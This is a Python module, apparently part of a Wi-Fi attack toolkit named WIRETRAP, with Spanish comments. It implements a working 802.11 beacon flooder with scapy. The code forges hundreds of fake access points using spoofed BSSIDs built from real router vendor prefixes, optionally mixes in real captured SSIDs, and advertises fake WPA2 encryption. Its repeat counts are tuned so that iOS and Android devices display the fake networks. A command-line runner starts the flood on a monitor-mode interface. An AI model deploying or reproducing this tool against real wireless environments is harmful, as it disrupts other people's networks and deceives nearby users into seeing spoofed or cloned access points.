import threading
import time
import random
import string
import os
import sys

WIRETRAP_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, WIRETRAP_DIR)

from scapy.all import sendp, RadioTap
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt


# OUIs reales de routers domésticos (Cisco, TP-Link, Netgear, ASUS, Ubiquiti...)
_REAL_OUIS = [
    (0x00, 0x50, 0xF2),  # Microsoft / routers Cisco
    (0xC8, 0x3A, 0x35),  # Tenda
    (0x50, 0xC7, 0xBF),  # TP-Link
    (0x14, 0xCC, 0x20),  # TP-Link
    (0x18, 0xA6, 0xF7),  # NETGEAR
    (0x2C, 0x30, 0x33),  # NETGEAR
    (0x04, 0x92, 0x26),  # ASUS
    (0x10, 0xBF, 0x48),  # ASUS
    (0x80, 0x2A, 0xA8),  # Ubiquiti
    (0xDC, 0x9F, 0xDB),  # Ubiquiti
    (0x68, 0x72, 0x51),  # Huawei
    (0xAC, 0x84, 0xC9),  # Huawei
    (0x00, 0x1A, 0x11),  # Google (Nest/WiFi)
    (0xF4, 0xF5, 0xDB),  # Google
    (0xB0, 0x95, 0x8E),  # Apple AirPort
    (0x70, 0x73, 0xCB),  # D-Link
    (0xBC, 0xF6, 0x85),  # D-Link
]


def _random_mac():
    """Genera una MAC realista usando OUIs de fabricantes conocidos."""
    oui = random.choice(_REAL_OUIS)
    mac = list(oui) + [random.randint(0, 255) for _ in range(3)]
    return ":".join(f"{b:02x}" for b in mac)


def _random_ssid(length=None):
    """Genera un SSID aleatorio de longitud variable."""
    if length is None:
        length = random.randint(4, 20)
    chars = string.ascii_letters + string.digits + " _-"
    return "".join(random.choices(chars, k=length))


class BeaconFlooder:
    """
    Inunda el espectro 802.11 con cientos de SSIDs falsos.

    Cada beacon usa:
    - SSID: aleatorio o mezclado con SSIDs reales capturados
    - BSSID: MAC aleatoria por beacon (confunde aún más los scanners)
    - Canal: el configurado (fijo) o rotatorio entre 1/6/11
    - Cifrado: anunciado como WPA2 para parecer redes reales

    Requiere interfaz en modo monitor con inyección.
    """

    def __init__(self, interface):
        self.interface = interface
        self.running = False
        self._thread = None

        # Configuración
        self.channel = 6
        self.rotate_channels = False          # Rotar entre canales 1/6/11
        self.mix_real_ssids = False           # Mezclar SSIDs reales
        self.real_ssids: list[str] = []       # Poblado desde fuera (scanner)
        self.interval = 0.001                 # Segundos entre beacons (≈1ms → ~1000/s)
        self.announce_wpa2 = True             # Anunciar cifrado WPA2 falso

        # Callbacks GUI
        self.on_beacon_sent = None            # fn(count)
        self.on_stopped = None                # fn()

    def _pick_ssid(self):
        """Elige SSID: real (si hay y está habilitado) o aleatorio."""
        if self.mix_real_ssids and self.real_ssids and random.random() < 0.4:
            return random.choice(self.real_ssids)
        return _random_ssid()

    def _build_beacon(self, ssid, bssid, channel):
        """
        Construye un beacon 802.11 completo.
        Si announce_wpa2=True añade los IEs de RSN para que el SSID
        aparezca con candado en los dispositivos cercanos.
        """
        # RSN IE (WPA2): aparece con 🔒 en la lista WiFi del móvil
        rsn_ie = (
            b"\x30\x18"          # RSN IE tag + len
            b"\x01\x00"          # version 1
            b"\x00\x0f\xac\x04"  # group cipher: CCMP
            b"\x01\x00"          # pairwise cipher count: 1
            b"\x00\x0f\xac\x04"  # pairwise cipher: CCMP
            b"\x01\x00"          # AKM count: 1
            b"\x00\x0f\xac\x02"  # AKM: PSK
            b"\x0c\x00"          # RSN capabilities
        )

        frame = (
            RadioTap() /
            Dot11(
                type=0,
                subtype=8,
                addr1="ff:ff:ff:ff:ff:ff",
                addr2=bssid,
                addr3=bssid
            ) /
            Dot11Beacon(cap="ESS+privacy") /
            Dot11Elt(ID="SSID", info=ssid) /
            Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24") /
            Dot11Elt(ID="DSset", info=bytes([channel]))
        )

        if self.announce_wpa2:
            frame = frame / Dot11Elt(ID=48, info=rsn_ie[2:])  # RSN (ID=48)

        return frame

    def _flood_loop(self):
        """Bucle principal de flooding."""
        channels = [1, 6, 11]
        ch_idx = 0
        count = 0
        last_report = time.time()

        # Cuántas veces repetir cada SSID/BSSID antes de rotar.
        # iOS/Android necesitan ver el mismo BSSID durante ~10 beacons
        # (aprox. 1-2 segundos al ritmo estándar de 10 beacons/s) para
        # considerarlo una red real y mostrarlo en la lista WiFi.
        REPEATS_PER_AP = 15

        while self.running:
            ssid = self._pick_ssid()
            bssid = _random_mac()

            if self.rotate_channels:
                ch = channels[ch_idx % len(channels)]
                ch_idx += 1
            else:
                ch = self.channel

            try:
                pkt = self._build_beacon(ssid, bssid, ch)
                # Enviar el mismo beacon varias veces para que el móvil
                # lo reconozca como una red estable
                sendp(pkt, iface=self.interface, count=REPEATS_PER_AP,
                      inter=0.1, verbose=False)
                count += REPEATS_PER_AP
            except Exception:
                pass

            # Reportar cada 0.5 s para no saturar la GUI
            now = time.time()
            if now - last_report >= 0.5:
                if self.on_beacon_sent:
                    self.on_beacon_sent(count)
                last_report = now

            if self.interval > 0:
                time.sleep(self.interval)

        if self.on_stopped:
            self.on_stopped()

    def start(self, channel=6, interval=0.001,
              rotate_channels=False, mix_real_ssids=False,
              real_ssids=None):
        """
        Inicia el beacon flood en un thread separado.

        Args:
            channel:         Canal fijo (ignorado si rotate_channels=True)
            interval:        Segundos entre beacons (0.001 = ~1000/s)
            rotate_channels: Rotar entre canales 1, 6 y 11
            mix_real_ssids:  Mezclar SSIDs reales entre los falsos
            real_ssids:      Lista de SSIDs reales del scanner
        """
        if self.running:
            return

        self.channel = channel
        self.interval = max(0, interval)
        self.rotate_channels = rotate_channels
        self.mix_real_ssids = mix_real_ssids
        self.real_ssids = real_ssids or []

        self.running = True
        self._thread = threading.Thread(
            target=self._flood_loop,
            daemon=True
        )
        self._thread.start()

    def stop(self):
        """Detiene el flooding."""
        self.running = False
        if self._thread:
            self._thread.join(timeout=2)
        self._thread = None


# ── Test en terminal ──────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Uso: sudo python3 beacon_flood.py <interfaz_monitor>")
        print("Ejemplo: sudo python3 beacon_flood.py wlan0mon")
        sys.exit(1)

    iface = sys.argv[1]
    flooder = BeaconFlooder(iface)

    def on_sent(count):
        print(f"\r[*] Beacons enviados: {count}", end="", flush=True)

    def on_stopped():
        print("\n[!] Beacon flood detenido.")

    flooder.on_beacon_sent = on_sent
    flooder.on_stopped = on_stopped

    print(f"[*] Iniciando Beacon Flood en {iface}")
    print(f"    Ctrl+C para detener\n")

    try:
        flooder.start(channel=6, rotate_channels=True)
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        flooder.stop()
